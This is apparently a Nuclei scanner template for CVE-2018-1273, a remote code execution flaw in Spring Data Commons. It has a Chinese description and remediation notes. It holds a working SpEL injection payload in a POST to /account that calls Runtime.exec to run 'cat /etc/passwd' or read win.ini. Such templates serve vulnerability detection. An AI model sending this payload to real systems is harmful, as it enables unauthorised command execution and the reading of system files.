id: CVE-2018-1273
info:
  name: Spring Data Commons - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Spring Data Commons 远程命令执行漏洞
    Spring Data Commons（1.13至1.13.10之前的版本，2.0至2.0.5的版本以及较旧的不受支持的版本）包含由于特殊元素的不正确中和而导致的属性绑定器漏洞。未经身份验证的远程恶意用户（或攻击者）可以针对Spring Data REST支持的HTTP资源提供特制的请求参数，或者使用Spring Data的基于投影的请求有效负载绑定帽可能导致远程执行代码攻击。
  severity: critical
  remediation: |-
    #### 官方修复方案：
    升级系统至无漏洞版本，或于官网下载安全补丁。
    #### 临时修复方案：
    该漏洞是由前端参数传入后台，后台框架使用SpEL表达式处理未校验的恶意字符串所引起的，因此建议采取IP白名单对IP进行限制，或者升级框架到最新版本。将Spring Data Commons框架的版本由2.0.x升级到2.0.6，1.13.x的用户升级到1.13.11
requests:
- matchers:
  - type: regex
    condition: or
    part: body
    regex:
    - 'root:.*:0:0:'
    - \[(font|extension|file)s\]
  raw:
  - |
    POST /account HTTP/1.1
    Host: {{Hostname}}
    Connection: close
    Content-Type: application/x-www-form-urlencoded

    name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('{{url_encode('{{command}}')}}')]=nuclei
  payloads:
    command:
    - cat /etc/passwd
    - type C:\/Windows\/win.ini
